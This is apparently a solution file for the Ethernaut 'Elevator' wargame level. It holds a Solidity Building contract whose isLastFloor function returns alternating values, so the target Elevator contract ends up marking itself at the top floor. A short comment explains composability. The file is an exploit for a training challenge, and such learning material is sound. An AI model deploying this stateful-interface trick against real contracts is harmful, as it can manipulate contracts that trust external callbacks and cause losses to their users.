/*
    This is a good one, explains the user about interfaces and composability in Web3..

    What the heck is composability?
    - Nothing much, just the way smart contracts interact with each other and the way we use them building on top of each other, instead of reinventing the wheel..

    Let's come to the solution, clear cut as you can see the code

    We just need a Building contract which will be calling the Elevator.sol and function `isLastFloor` need to be implemented in such a way that top becomes true!!
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator{
    function goTo(uint) external;
}

contract Building {
    bool public toggle = true;
    Elevator public target;

    constructor (address _target){
        target = Elevator(_target);
    }

    function isLastFloor(uint) public returns(bool){
        toggle = !toggle;
        return toggle;
    }

    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}